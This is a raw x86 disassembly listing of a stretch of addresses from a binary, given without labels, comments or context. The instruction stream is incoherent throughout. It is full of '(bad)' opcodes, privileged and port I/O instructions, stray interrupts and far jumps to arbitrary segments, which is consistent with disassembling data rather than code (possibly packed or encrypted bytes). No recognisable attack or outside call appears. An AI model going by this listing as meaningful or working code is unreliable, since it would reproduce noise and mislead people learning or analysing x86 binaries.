  41e6af:	sbb    al,0xaa
  41e6b1:	imul   eax,DWORD PTR [eax+ecx*1+0xc],0x5880a5a0
  41e6b9:	cld    
  41e6ba:	pop    edx
  41e6bb:	aam    0x71
  41e6bd:	rcl    eax,0x7c
  41e6c0:	mov    ebx,0xc9366ab5
  41e6c5:	es call 0x72db6e54
  41e6cb:	fs mov esi,0x992a6f24
  41e6d1:	dec    eax
  41e6d2:	imul   eax,DWORD PTR es:[edi+0x3eb5635d],0x7d92e5b2
  41e6dd:	xor    ebp,DWORD PTR [eax+0x37]
  41e6e0:	lods   al,BYTE PTR ds:[esi]
  41e6e1:	iret   
  41e6e2:	sbb    al,0xac
  41e6e4:	ret    
  41e6e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6e6:	pop    esi
  41e6e7:	pop    es
  41e6e8:	mov    ch,0x79
  41e6ea:	out    dx,eax
  41e6eb:	inc    eax
  41e6ec:	dec    edx
  41e6ed:	inc    eax
  41e6ee:	pop    ds
  41e6ef:	jl     0x41e674
  41e6f1:	adc    bh,BYTE PTR [ebx+0x77839a66]
  41e6f7:	jge    0x41e6b5
  41e6f9:	hlt    
  41e6fa:	jcxz   0x41e697
  41e6fd:	inc    ebx
  41e6fe:	jmp    0x41e715
  41e700:	jmp    0x41e77f
  41e702:	mov    dh,BYTE PTR [ecx-0x7e]
  41e705:	mov    bh,0x48
  41e707:	jmp    0x1a48fe1a
  41e70c:	fsubr  QWORD PTR [esi-0x7c1c1b26]
  41e712:	rol    ah,cl
  41e714:	jmp    0x159:0x6aba180d
  41e71b:	adc    BYTE PTR [edx],0x3d
  41e71e:	int    0x91
  41e720:	dec    esi
  41e721:	or     BYTE PTR [edx+0x10],cl
  41e724:	mov    ebp,0xb790bd34
  41e729:	fisub  DWORD PTR [ecx+0x37550e52]
  41e72f:	daa    
  41e730:	and    edi,DWORD PTR [esi+0x3506867]
  41e736:	add    esp,DWORD PTR [edx]
  41e738:	outs   dx,DWORD PTR ds:[esi]
  41e739:	mov    ebx,DWORD PTR [ebp+0x5c]
  41e73c:	ds clc 
  41e73e:	fnstenv [ebp+ebp*4-0x52]
  41e742:	mov    al,0xd6
  41e744:	sbb    al,0x11
  41e746:	std    
  41e747:	or     dh,ah
  41e749:	in     al,dx
  41e74a:	out    0x65,eax
  41e74c:	mov    ch,0xcc
  41e74e:	ficomp WORD PTR [ebp-0x23]
  41e751:	xor    eax,0xb5ab2768
  41e756:	xchg   ebx,eax
  41e757:	enter  0xf932,0x96
  41e75b:	imul   BYTE PTR [ebp-0x67680e55]
  41e761:	mov    BYTE PTR [edx-0x37],bh
  41e764:	mov    dl,0x94
  41e766:	and    ebx,DWORD PTR [edi+0x14]
  41e769:	mov    ah,0x25
  41e76b:	(bad)  
  41e76c:	out    dx,al
  41e76d:	into   
  41e76e:	gs inc ecx
  41e770:	push   esp
  41e771:	and    al,BYTE PTR [eax+0x427d5d0b]
  41e777:	cmp    BYTE PTR [eax],dl
  41e779:	add    BYTE PTR [edi+0x14],al
  41e77c:	xchg   edx,eax
  41e77d:	rol    BYTE PTR [edx+0x78],1
  41e780:	ret    0xf374
  41e783:	arpl   di,cx
  41e785:	icebp  
  41e786:	mov    bl,0x7e
  41e788:	mul    ebp
  41e78a:	push   ss
  41e78b:	and    dh,BYTE PTR [edx+esi*8-0x7e]
  41e78f:	or     ah,BYTE PTR [ebp+ecx*2+0x56]
  41e793:	(bad)  
  41e794:	(bad)  
  41e795:	cmp    dh,ch
  41e797:	jmp    0xabd0:0x7d00e0a1
  41e79e:	inc    ebx
  41e79f:	fistp  QWORD PTR [ebp-0xc]
  41e7a2:	retf   0xcedc
  41e7a5:	mov    eax,ds:0x1394c43a
  41e7aa:	aas    
  41e7ab:	data16 je 0x41e80f
  41e7ae:	jle    0x41e7b1
  41e7b0:	mov    ah,0x58
  41e7b2:	add    BYTE PTR ds:0xb1be2b34,bh
  41e7b8:	call   0x28afa4b1
  41e7bd:	ins    DWORD PTR es:[edi],dx
  41e7be:	mov    eax,0xa6ef9d26
  41e7c3:	mov    ecx,ebx
  41e7c5:	sub    BYTE PTR [edi],ch
  41e7c7:	std    
  41e7c8:	xchg   edx,eax
  41e7c9:	adc    edx,DWORD PTR [esi-0x5dcce8ec]
  41e7cf:	xor    DWORD PTR [eax],ebp
  41e7d1:	loopne 0x41e7b2
  41e7d3:	test   BYTE PTR [edi-0x1b],0x5c
  41e7d7:	repnz dec ebx
  41e7d9:	adc    eax,0x94283630
  41e7de:	or     esi,esi
  41e7e0:	ficom  WORD PTR [esi+ebx*4-0x40]
  41e7e4:	add    ebp,DWORD PTR [ebx]
  41e7e6:	xchg   ecx,eax
  41e7e7:	push   0xffffffab
  41e7e9:	and    edx,ecx
  41e7eb:	dec    edi
  41e7ec:	adc    eax,0xe18c92ff
  41e7f1:	pop    eax
  41e7f2:	imul   ecx,DWORD PTR [edx+0x5ca17f67],0x85be7f55
  41e7fc:	xlat   BYTE PTR ds:[ebx]
  41e7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7fe:	add    al,0x5c
  41e800:	(bad)  [esi+0x3eedaaec]
  41e806:	push   edi
  41e807:	push   0x6a0c10cc
  41e80c:	mov    ebx,0x562a397e
  41e811:	or     al,0x5b
  41e813:	push   ss
  41e814:	or     eax,0xefddb4ea
  41e819:	push   0x7c
  41e81b:	aad    0x75
  41e81d:	jmp    0x41e7d8
  41e81f:	sub    eax,0xd455882f
  41e824:	mov    bl,0x1b
  41e826:	bnd jmp 0x758e82d0
  41e82c:	test   DWORD PTR [ecx-0x6150515a],ecx
  41e832:	xor    al,0xc4
  41e834:	sbb    BYTE PTR [esi-0x7d],0xac
  41e838:	or     ebx,edi
  41e83a:	adc    DWORD PTR [ebx],ebx
  41e83c:	gs xor al,0x1b
  41e83f:	mov    ch,0x5b
  41e841:	lods   al,BYTE PTR ds:[esi]
  41e842:	addr16 mov ds:0x4cb0,eax
  41e846:	jmp    0xd7dc:0xc45fe9a8
  41e84d:	jmp    0x41e88e
  41e84f:	adc    eax,0xb67f89a5
  41e854:	test   BYTE PTR [ebp+eiz*2-0x6f],bl
  41e858:	mov    ds:0xee91b98f,al
  41e85d:	cmp    al,0x7f
  41e85f:	add    cl,dh
  41e861:	mov    edi,0x65b5677f
  41e866:	mov    esp,0x8af3d61e
  41e86b:	push   es
  41e86c:	jge    0x41e826
  41e86e:	retf   0x298f
  41e871:	ins    BYTE PTR es:[edi],dx
  41e872:	imul   ebp,DWORD PTR [edx-0x54300e38],0x80779b42
  41e87c:	jmp    0x97378e82
  41e881:	je     0x41e80c
  41e883:	mov    al,ds:0x6b4be686
  41e888:	ins    DWORD PTR es:[edi],dx
  41e889:	jb     0x41e85c
  41e88b:	imul   ebp,DWORD PTR [ebp+0x7792a266],0xd19564d8
  41e895:	jmp    0x41e84f
  41e897:	into   
  41e898:	and    esp,edx
  41e89a:	or     edx,0x9007b1b
  41e8a0:	adc    al,0xbb
  41e8a2:	daa    
  41e8a3:	add    eax,0xc24a083e
  41e8a8:	push   es
  41e8a9:	mov    al,ds:0x8cf7f8f
  41e8ae:	into   
  41e8af:	ins    DWORD PTR es:[edi],dx
  41e8b0:	out    dx,eax
  41e8b1:	mov    esp,edi
  41e8b3:	dec    eax
  41e8b4:	mov    ds:0xa92f5667,eax
  41e8b9:	mov    ecx,0x2a41f449
  41e8be:	and    DWORD PTR ds:0xb396091a,0x4a
  41e8c5:	repnz in eax,dx
  41e8c7:	adc    BYTE PTR [ebx+0x766078ad],ah
  41e8cd:	je     0x41e919
  41e8cf:	cli    
  41e8d0:	adc    DWORD PTR [esi+esi*1],ecx
  41e8d3:	jp     0x41e893
  41e8d5:	mov    al,0x5
  41e8d7:	push   ecx
  41e8d8:	out    dx,al
  41e8d9:	jmp    0xbb5ebac7
  41e8de:	push   edx
  41e8df:	xor    ebp,DWORD PTR [ebx-0x72]
  41e8e2:	loope  0x41e867
  41e8e4:	popf   
  41e8e5:	jbe    0x41e8ae
  41e8e7:	inc    esi
  41e8e8:	xor    al,0xdb
  41e8ea:	pop    ds
  41e8eb:	inc    esi
  41e8ec:	xchg   bh,dl
  41e8ee:	push   cs
  41e8ef:	mov    al,0xbb
  41e8f1:	das    
  41e8f2:	mov    eax,ds:0x215c561e
  41e8f7:	push   edi
  41e8f8:	lea    ebx,[ebx]
  41e8fa:	in     eax,0xd7
  41e8fc:	xchg   ebp,eax
  41e8fd:	xchg   BYTE PTR [ebx-0x787a2677],dl
  41e903:	int3   
  41e904:	mov    eax,0xd4371097
  41e909:	jo     0x41e8d0
  41e90b:	neg    BYTE PTR [ebx+0x4b2d6a93]
  41e911:	cli    
  41e912:	xchg   esi,eax
  41e913:	cs sub eax,0x8da90fc4
  41e919:	pop    ss
  41e91a:	cmp    esp,DWORD PTR [esi+0x217196dd]
  41e920:	int    0x2
  41e922:	or     al,0xe1
  41e924:	cmp    al,0xca
  41e926:	push   edi
  41e927:	mov    dh,0x95
  41e929:	xor    esi,DWORD PTR [esi-0x66]
  41e92c:	mov    eax,ds:0x61f25d1f
  41e931:	and    esi,ecx
  41e933:	jle    0x41e992
  41e935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e936:	loop   0x41e932
  41e938:	push   ebp
  41e939:	jle    0x41e924
  41e93b:	aam    0xb9
  41e93d:	imul   ecx,eax,0x18d7ef3a
  41e943:	sub    ecx,edi
  41e945:	call   ebx
  41e947:	mov    ss,esi
  41e949:	pop    ds
  41e94a:	test   BYTE PTR [edx-0x14fa518b],al
  41e950:	cmp    BYTE PTR [eax+0x723cd1d4],0xfc
  41e957:	pop    ecx
  41e958:	jbe    0x41e9b5
  41e95a:	inc    esp
  41e95b:	dec    esi
  41e95c:	lds    esp,FWORD PTR [esi+0x53a3ebe]
  41e962:	daa    
  41e963:	(bad)  
  41e964:	les    esi,FWORD PTR [ecx]
  41e966:	inc    eax
  41e967:	fisttp QWORD PTR [eax+0x2d]
  41e96a:	jne    0x41e995
  41e96c:	imul   edx,DWORD PTR [ecx+0x1a519a0c],0x2b
  41e973:	popf   
  41e974:	add    eax,0x30615e63
  41e979:	ins    DWORD PTR es:[edi],dx
  41e97a:	enter  0x6f85,0x50
  41e97e:	and    al,cl
  41e980:	in     eax,0xcb
  41e982:	lods   al,BYTE PTR ds:[esi]
  41e983:	daa    
  41e984:	sar    BYTE PTR [ebx-0x10ef55a4],0xa
  41e98b:	fs pushf 
  41e98d:	push   ecx
  41e98e:	lahf   
  41e98f:	sub    al,0x91
  41e991:	pop    ebx
  41e992:	ins    DWORD PTR es:[edi],dx
  41e993:	or     ah,BYTE PTR [edx+0x39b7bf8f]
  41e999:	cld    
  41e99a:	nop
  41e99b:	jnp    0x41e99f
  41e99d:	push   0xffffffcd
  41e99f:	push   esi
  41e9a0:	adc    eax,0xebdfe8a9
  41e9a5:	pop    esi
  41e9a6:	ds mov eax,?
  41e9a9:	mov    bh,0x7c
  41e9ab:	xchg   ebx,eax
  41e9ac:	arpl   WORD PTR [esi],sp
  41e9ae:	retf   
  41e9af:	gs jmp 0xc1037cad
  41e9b5:	push   eax
  41e9b6:	repnz in al,dx
  41e9b8:	pop    esp
  41e9b9:	xor    ebp,DWORD PTR [ecx-0x52af3e98]
  41e9bf:	xchg   BYTE PTR [edx-0x2d21705e],bl
  41e9c5:	sbb    eax,0xb88b4fa8
  41e9ca:	rol    DWORD PTR [esi-0x60],0xbe
  41e9ce:	dec    ebx
  41e9cf:	cli    
  41e9d0:	jno    0x41e964
  41e9d2:	dec    ebp
  41e9d3:	ja     0x41e956
  41e9d5:	pop    edi
  41e9d6:	leave  
  41e9d7:	fbstp  TBYTE PTR [edx+0x78]
  41e9da:	(bad)  
  41e9db:	fbstp  TBYTE PTR [esi-0x572148f0]
  41e9e1:	pushf  
  41e9e2:	lods   eax,DWORD PTR ds:[esi]
  41e9e3:	xchg   ebp,eax
  41e9e4:	sti    
  41e9e5:	and    edi,DWORD PTR [esi+0x15a0ae47]
  41e9eb:	pop    edi
  41e9ec:	jmp    0xaf3e:0xc56b0786
  41e9f3:	fisubr DWORD PTR [eax+ebp*2]
  41e9f6:	xchg   BYTE PTR [edi],dh
  41e9f8:	cmc    
  41e9f9:	clc    
  41e9fa:	pop    es
  41e9fb:	inc    edx
  41e9fc:	inc    eax
  41e9fd:	xor    DWORD PTR [esi-0x16d1b190],ecx
  41ea03:	jl     0x41e9fe
  41ea05:	dec    ebx
  41ea06:	fwait
  41ea07:	cmp    eax,0x79129cbe
  41ea0c:	daa    
  41ea0d:	icebp  
  41ea0e:	push   ss
  41ea0f:	and    eax,0xd1050d19
  41ea14:	outs   dx,BYTE PTR ds:[esi]
  41ea15:	fist   DWORD PTR [ebx+0x43]
  41ea18:	dec    ecx
  41ea19:	sbb    eax,0x125faa59
  41ea1e:	mov    bl,0x7c
  41ea20:	pusha  
  41ea21:	stos   DWORD PTR es:[edi],eax
  41ea22:	int3   
  41ea23:	xchg   esp,eax
  41ea24:	lea    ecx,ds:0x9459c93d
  41ea2a:	mov    ecx,DWORD PTR [esi+0x38827f29]
  41ea30:	push   edx
  41ea31:	push   ds
  41ea32:	es test al,0x3
  41ea35:	out    dx,al
  41ea36:	enter  0x8937,0x80
  41ea3a:	mov    ebx,0xf52f3096
  41ea3f:	icebp  
  41ea40:	lds    esp,FWORD PTR [edx-0x5e]
  41ea43:	or     al,0xbc
  41ea46:	bound  eax,QWORD PTR [ecx-0x36b89bce]
  41ea4c:	lods   eax,DWORD PTR ds:[esi]
  41ea4d:	sbb    DWORD PTR [edx],ebx
  41ea4f:	fdivr  DWORD PTR [esi]
  41ea51:	mov    ah,0x14
  41ea53:	imul   ebp,DWORD PTR [ecx+0xfbdeda9],0x6
  41ea5a:	iret   
  41ea5b:	inc    esi
  41ea5c:	cli    
  41ea5d:	daa    
  41ea5e:	leave  
  41ea5f:	xchg   DWORD PTR [ecx+edx*4+0x4a310f91],esi
  41ea66:	inc    esp
  41ea67:	out    dx,al
  41ea68:	inc    esi
  41ea69:	mov    eax,0xa8122e63
  41ea6e:	mov    WORD PTR [esi+0x636bdabf],fs
  41ea74:	jge    0x41ea76
  41ea76:	ins    DWORD PTR es:[edi],dx
  41ea77:	jecxz  0x41ea72
  41ea79:	cmp    DWORD PTR [ecx],eax
  41ea7b:	or     al,0xfd
  41ea7d:	in     eax,dx
  41ea7e:	xor    eax,0xbd33acf4
  41ea83:	data16 scas al,BYTE PTR es:[edi]
  41ea85:	clc    
  41ea86:	loopne 0x41eab9
  41ea88:	inc    esi
  41ea89:	(bad)  
  41ea8a:	mov    BYTE PTR [ebx+0x3c5b7b8],ah
  41ea90:	mov    ds:0x47542113,eax
  41ea95:	sbb    al,0xa9
  41ea97:	xchg   esi,eax
  41ea98:	mov    dl,BYTE PTR ss:0x64bf8e78
  41ea9f:	es inc ecx
  41eaa1:	scas   al,BYTE PTR es:[edi]
  41eaa2:	sub    DWORD PTR [edi-0x7e],ebp
  41eaa5:	(bad)  [edi-0x33]
  41eaa8:	xchg   ebp,eax
  41eaa9:	push   edi
  41eaaa:	stc    
  41eaab:	test   BYTE PTR [eax-0x6953c67d],bh
  41eab1:	outs   dx,DWORD PTR ds:[esi]
  41eab2:	push   edi
  41eab3:	es jno 0x41eade
  41eab6:	cli    
  41eab7:	fs retf 
  41eab9:	mov    ebx,ebp
  41eabb:	mov    esp,esi
  41eabd:	out    0x78,al
  41eabf:	(bad)
  41eac2:	call   0x5a75d757
  41eac7:	push   ebx
  41eac8:	pop    ebp
  41eac9:	jnp    0x41eab2
  41eacb:	adc    eax,0xa9533f89
  41ead0:	pop    ebp
  41ead1:	jae    0x41eacb
  41ead3:	xchg   esp,eax
  41ead4:	or     DWORD PTR [ebp-0x22],esi
  41ead7:	test   eax,0xeccfdffb
  41eadc:	mov    eax,0x451c3459
  41eae1:	xchg   ecx,eax
  41eae2:	in     eax,0xd4
  41eae4:	xor    DWORD PTR [ebp+0x5d],edi
  41eae7:	or     ebx,DWORD PTR [ebp+eax*2-0x3f]
  41eaeb:	adc    edx,DWORD PTR [edx-0x3d6470]
  41eaf1:	pop    esp
  41eaf2:	ficomp DWORD PTR [esi+ebx*1+0x73201091]
  41eaf9:	mov    ds:0xfe4c9e59,al
  41eafe:	iret   
  41eaff:	bt     DWORD PTR [edi+edx*4-0x4b78eb7b],eax
  41eb07:	test   BYTE PTR [ebx-0x2a604830],ah
  41eb0d:	dec    esp
  41eb0e:	dec    ebx
  41eb0f:	jecxz  0x41ead7
  41eb11:	push   esi
  41eb12:	in     eax,0x45
  41eb14:	xor    BYTE PTR [eax+0x7d2d567b],bh
  41eb1a:	mov    ebp,DWORD PTR [ebx]
  41eb1c:	mov    bl,0x9f
  41eb1e:	lahf   
  41eb1f:	mov    esp,0xc60db81c
  41eb24:	fcomp  QWORD PTR [edi+0x500a7e9e]
  41eb2a:	fwait
  41eb2b:	test   cl,ch
  41eb2d:	inc    esp
  41eb2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb2f:	int3   
  41eb30:	mov    ecx,0x917eb751
  41eb35:	cli    
  41eb36:	mov    dh,0xe1
  41eb38:	fcmovnu st,st(7)
  41eb3a:	ins    BYTE PTR es:[edi],dx
  41eb3b:	jg     0x41eaef
  41eb3d:	jle    0x41eb96
  41eb3f:	push   ebx
  41eb40:	sbb    eax,0x8b64cafa
  41eb45:	cs call 0x7cb59536
  41eb4b:	cmp    edi,DWORD PTR [edx]
  41eb4d:	stos   DWORD PTR es:[edi],eax
  41eb4e:	jae    0x41eb6a
  41eb50:	lock dec edi
  41eb52:	aad    0x95
  41eb54:	popf   
  41eb55:	js     0x41eba0
  41eb57:	mov    dh,0xac
  41eb59:	jl     0x41eb82
  41eb5b:	push   es
  41eb5c:	and    eax,0x1ef06ef5
  41eb61:	cli    
  41eb62:	cmp    DWORD PTR [eax+0x22b6e75a],edx
  41eb68:	pop    ds
  41eb69:	sub    DWORD PTR [esi+0x43ff2b07],eax
  41eb6f:	xchg   edi,eax
  41eb70:	xor    eax,0x78b775df
  41eb75:	inc    edx
  41eb76:	cmp    ch,BYTE PTR [esi+eax*4]
  41eb79:	mov    ah,0x29
  41eb7b:	push   ebp
  41eb7c:	pushf  
  41eb7d:	in     eax,0x7a
  41eb7f:	and    edx,DWORD PTR [ecx-0x1b]
  41eb82:	(bad)  
  41eb83:	cmp    BYTE PTR [edx-0x2381b46e],ah
  41eb89:	sub    BYTE PTR [ebx+edx*2-0x4f],0x91
  41eb8e:	dec    edi
  41eb8f:	mov    edx,0x97e3ed3d
  41eb94:	and    ecx,DWORD PTR [ecx]
  41eb96:	call   FWORD PTR [edi-0x1b]
  41eb99:	lds    esi,FWORD PTR [ebp+eiz*8+0x695d5f54]
  41eba0:	stos   DWORD PTR es:[edi],eax
  41eba1:	cmp    ah,BYTE PTR [esi]
  41eba3:	ret    0xb74e
  41eba6:	jo     0x41ebea
  41eba8:	cmp    BYTE PTR [ecx],ch
  41ebaa:	je     0x41eb98
  41ebac:	dec    edx
  41ebad:	xor    edx,esi
  41ebaf:	ficomp DWORD PTR [ecx+0x70]
  41ebb2:	adc    eax,DWORD PTR [edi-0x2bbba9a8]
  41ebb8:	inc    eax
  41ebb9:	add    BYTE PTR [ebx],0x93
  41ebbc:	mov    ebx,0x291a0a5
  41ebc1:	mov    bh,0xea
  41ebc3:	mov    eax,ds:0xe5f0a90b
  41ebc8:	ror    DWORD PTR [eax-0x62],0xd3
  41ebcc:	push   ebp
  41ebcd:	pop    esp
  41ebce:	pusha  
  41ebcf:	mov    ah,0x19
  41ebd1:	jmp    0x2f5e:0x4df94df1
  41ebd8:	neg    ch
  41ebda:	mov    bh,0x3f
  41ebdc:	outs   dx,DWORD PTR ds:[esi]
  41ebdd:	cld    
  41ebde:	je     0x41ebaf
  41ebe0:	mov    ch,0xc9
  41ebe2:	scas   al,BYTE PTR es:[edi]
  41ebe3:	or     DWORD PTR [eax+edx*8],0x7a5df07
  41ebea:	jo     0x41ec49
  41ebec:	repz adc edx,DWORD PTR [edx+0x51]
  41ebf0:	cmc    
  41ebf1:	jmp    0x97285768
  41ebf6:	and    edx,DWORD PTR [eax]
  41ebf8:	xchg   bx,ax
  41ebfa:	cs fbstp TBYTE PTR es:[ebp+0x23]
  41ebff:	loopne 0x41ebfe
  41ec01:	push   ebp
  41ec02:	jle    0x41ebe2
  41ec04:	or     BYTE PTR [esi+0x52],ah
  41ec07:	push   ss
  41ec08:	ret    
  41ec09:	loopne 0x41ebab
  41ec0b:	xchg   esp,eax
  41ec0c:	jge    0x41ec62
  41ec0e:	cmc    
  41ec0f:	icebp  
  41ec10:	inc    BYTE PTR [ecx]
  41ec12:	popf   
  41ec13:	je     0x41ec68
  41ec15:	enter  0x9cf,0xfb
  41ec19:	vpsubq ymm5,ymm0,YMMWORD PTR cs:[ecx]
  41ec1e:	vpmacssdd ymm8,ymm4,ymm1,ymm5
  41ec24:	mov    al,0x72
  41ec26:	dec    ecx
  41ec27:	ins    DWORD PTR es:[edi],dx
  41ec28:	pop    ds
  41ec29:	jns    0x41ec62
  41ec2b:	add    ebx,ebx
  41ec2d:	ds mov ch,0x13
  41ec30:	mov    ds:0x6414d4eb,al
  41ec35:	fsubr  st,st(5)
  41ec37:	lea    ecx,[edx+0x7dc75576]
  41ec3d:	std    
  41ec3e:	sbb    esp,DWORD PTR gs:[edx+eiz*2]
  41ec42:	sub    eax,0x4deec4a6
  41ec47:	or     al,0xad
  41ec49:	test   cl,dh
  41ec4b:	jo     0x41ec30
  41ec4d:	js     0x41ec2d
  41ec4f:	fld    TBYTE PTR [eax]
  41ec51:	dec    ebx
  41ec52:	repz cmp ebp,DWORD PTR [edx-0x7d]
  41ec56:	cmp    ebp,DWORD PTR [ebp+0x125e05c3]
  41ec5c:	mov    ecx,0x849296ed
  41ec61:	jne    0x41ecb0
  41ec63:	ret    0x166c
  41ec66:	xchg   esi,eax
  41ec67:	mov    dh,0x3c
  41ec69:	xor    al,0xd7
  41ec6b:	retf   0x8dfd
  41ec6e:	or     al,0x1c
  41ec70:	loope  0x41eca2
  41ec72:	adc    edx,DWORD PTR [ebx+0x25fa5700]
  41ec78:	outs   dx,DWORD PTR ds:[esi]
  41ec79:	mov    ecx,0xd94bf072
  41ec7e:	or     DWORD PTR [ecx],ebx
  41ec80:	(bad)  
  41ec81:	cmp    DWORD PTR [esi],0x6f233236
  41ec87:	cmp    dl,BYTE PTR [esi-0x25]
  41ec8a:	(bad)  
  41ec8b:	push   edi
  41ec8c:	push   0xa0e02d74
  41ec91:	mov    edx,0xa8ee677
  41ec96:	out    dx,al
  41ec97:	push   es
  41ec98:	mov    al,0xad
  41ec9a:	enter  0x4801,0xda
  41ec9e:	pop    ds
  41ec9f:	scas   eax,DWORD PTR es:[edi]
  41eca0:	and    al,0xd5
  41eca2:	shl    BYTE PTR [eax+0x696858be],1
  41eca8:	mov    edx,0xefc776d
  41ecad:	cmp    DWORD PTR [edx+0x46],eax
  41ecb0:	ja     0x41ed1e
  41ecb2:	jne    0x41ed07
  41ecb4:	add    DWORD PTR [ebx+0x5890dfb4],ecx
  41ecba:	mov    cl,0x7d
  41ecbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecbd:	inc    eax
  41ecbe:	(bad)  
  41ecbf:	(bad)  
  41ecc0:	call   FWORD PTR fs:[ecx]
  41ecc3:	jns    0x41ecc6
  41ecc5:	jecxz  0x41ed40
  41ecc7:	push   esi
  41ecc8:	fisttp QWORD PTR [edx]
  41ecca:	push   edi
  41eccb:	scas   eax,DWORD PTR es:[edi]
  41eccc:	adc    edi,edi
  41ecce:	xchg   esp,eax
  41eccf:	ja     0x41ec8c
  41ecd1:	cmp    ch,BYTE PTR [ebp-0x64c1a25]
  41ecd7:	push   cs
  41ecd8:	mov    esp,0xaf2bcf20
  41ecdd:	add    DWORD PTR [edi+0x3c09d36f],0xffffffd4
  41ece4:	outs   dx,BYTE PTR ds:[esi]
  41ece5:	std    
  41ece6:	cs dec edx
  41ece8:	mov    ebp,ebp
  41ecea:	shl    DWORD PTR [esi-0x5588ce08],cl
  41ecf0:	loopne 0x41ecfe
  41ecf2:	mov    esp,0xb34433b4
  41ecf7:	fcom   st(5)
  41ecf9:	mov    ecx,0xfca97f70
  41ecfe:	mov    ebx,0xf9eaddf8
  41ed03:	idiv   DWORD PTR [ecx]
  41ed05:	xrelease mov BYTE PTR fs:[ecx+esi*1],cl
  41ed0a:	push   ss
  41ed0b:	inc    ebx
  41ed0c:	int3   
  41ed0d:	pop    ss
  41ed0e:	add    DWORD PTR [eax+0x1f06f1ae],0xffffffb3
  41ed15:	call   0xba51:0x6fc04edb
  41ed1c:	or     esi,DWORD PTR [edi+eiz*8]
  41ed1f:	lea    ebx,[ebx-0x752d0241]
  41ed25:	xor    esi,DWORD PTR [ebp-0x1d]
  41ed28:	jp     0x41ed2c
  41ed2a:	nop
  41ed2b:	cmp    al,0x93
  41ed2d:	push   0xbdf2144c
  41ed32:	ins    BYTE PTR es:[edi],dx
  41ed33:	xor    BYTE PTR [edx+eiz*1+0x2a5f451f],bl
  41ed3a:	shl    BYTE PTR [esi+0x242f8087],cl
  41ed40:	adc    cl,BYTE PTR [esi+0x23]
  41ed43:	ins    BYTE PTR es:[edi],dx
  41ed44:	cwde   
  41ed45:	std    
  41ed46:	in     eax,dx
  41ed47:	shr    DWORD PTR [eax+0x48ed705b],0x82
  41ed4e:	mov    eax,ds:0x7cddf629
  41ed53:	mov    bl,0xfb
  41ed55:	mul    BYTE PTR [ebx-0x1587e54b]
  41ed5b:	out    0x27,eax
  41ed5d:	scas   eax,DWORD PTR es:[edi]
  41ed5e:	dec    edx
  41ed5f:	xor    edi,DWORD PTR [ecx-0x5e]
  41ed62:	neg    DWORD PTR [edi+ebx*8]
  41ed65:	jecxz  0x41ed0b
  41ed67:	sbb    ch,BYTE PTR [edx+0x2]
  41ed6a:	ret    0xd566
  41ed6d:	sbb    eax,0x404e644b
  41ed72:	bound  esi,QWORD PTR [eax]
  41ed74:	clc    
  41ed75:	pop    ss
  41ed76:	fstp   QWORD PTR [ebx]
  41ed78:	xor    BYTE PTR [esi],dl
  41ed7a:	pop    ebp
  41ed7b:	fwait
  41ed7c:	(bad)  
  41ed7d:	retf   
  41ed7e:	push   ebx
  41ed7f:	dec    ebp
  41ed80:	lods   al,BYTE PTR ds:[esi]
  41ed81:	cdq    
  41ed82:	pop    ds
  41ed83:	jb     0x41ed37
  41ed85:	rcl    BYTE PTR [eax],0x95
  41ed88:	xchg   esi,eax
  41ed89:	xor    dl,dh
  41ed8b:	test   BYTE PTR [ebp+0x47],0x8c
  41ed8f:	lods   eax,DWORD PTR ds:[esi]
  41ed90:	and    BYTE PTR [bx-0x7],dh
  41ed94:	cld    
  41ed95:	outs   dx,BYTE PTR ds:[esi]
  41ed96:	(bad)  
  41ed97:	cdq    
  41ed98:	push   0xffffffcc
  41ed9a:	add    dl,0xaf
  41ed9d:	fwait
  41ed9e:	mov    edi,0x7edb4101
  41eda3:	xchg   esp,eax
  41eda4:	cmp    ah,BYTE PTR ds:0x6b938c09
  41edaa:	nop
  41edab:	in     eax,0x41
  41edad:	jg     0x41ed41
  41edaf:	xchg   edx,eax
  41edb0:	jns    0x41eda8
  41edb2:	ror    DWORD PTR [edi],1
  41edb4:	stc    
  41edb5:	mov    bh,0x2e
  41edb7:	fld    TBYTE PTR [edi-0x678c55e5]
  41edbd:	sar    cl,1
  41edbf:	sar    DWORD PTR [edx],cl
  41edc1:	icebp  
  41edc2:	lahf   
  41edc3:	mov    bl,0x9
  41edc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edc6:	ins    BYTE PTR es:[edi],dx
  41edc7:	rcl    BYTE PTR [ecx-0x36307cdf],cl
  41edcd:	add    ah,BYTE PTR [ecx-0x489a0de1]
  41edd3:	cdq    
  41edd4:	(bad)  
  41edd5:	push   cs
  41edd6:	das    
  41edd7:	(bad)  
  41edd9:	call   0x6bca:0xf45fe1f
  41ede0:	retf   0x20e0
  41ede3:	inc    DWORD PTR gs:[esi+esi*1-0x3db8cbf3]
  41edeb:	ret    0xc861
  41edee:	iret   
  41edef:	sbb    al,0x2e
  41edf1:	pop    ds
  41edf2:	mov    DWORD PTR [eax],0xbed2e04a
  41edf8:	add    al,0xf1
  41edfa:	xchg   BYTE PTR [ebx+ebx*8+0x8],ah
  41edfe:	mov    bl,0x33
  41ee00:	sub    al,0x60
  41ee02:	sub    eax,0x78b29ec
  41ee07:	gs push ebx
  41ee09:	sar    DWORD PTR [ebp-0x409e6b71],cl
  41ee0f:	dec    ecx
  41ee10:	mov    dl,0xff
  41ee12:	in     al,dx
  41ee13:	out    0x77,eax
  41ee15:	fiadd  DWORD PTR [edx]
  41ee17:	fstp   TBYTE PTR [esi+edi*2]
  41ee1a:	je     0x41ee63
  41ee1c:	outs   dx,BYTE PTR ds:[esi]
  41ee1d:	in     al,dx
  41ee1e:	add    DWORD PTR [edx+ebp*4-0x110901eb],esp
  41ee25:	ror    edx,cl
  41ee27:	sbb    edi,DWORD PTR [ebx]
  41ee29:	cmp    eax,0x316a13de
  41ee2e:	js     0x41ee5e
  41ee30:	adc    BYTE PTR [edx],0x4b
  41ee33:	jmp    0xf350:0x79729323
  41ee3a:	lods   al,BYTE PTR ds:[esi]
  41ee3b:	push   ecx
  41ee3c:	adc    BYTE PTR [edi],cl
  41ee3e:	and    al,BYTE PTR gs:0x4e638eda
  41ee45:	mov    ebx,0x189007f8
  41ee4a:	retf   
  41ee4b:	push   ecx
  41ee4c:	out    dx,eax
  41ee4d:	bound  ecx,QWORD PTR [edi-0x364bd4cd]
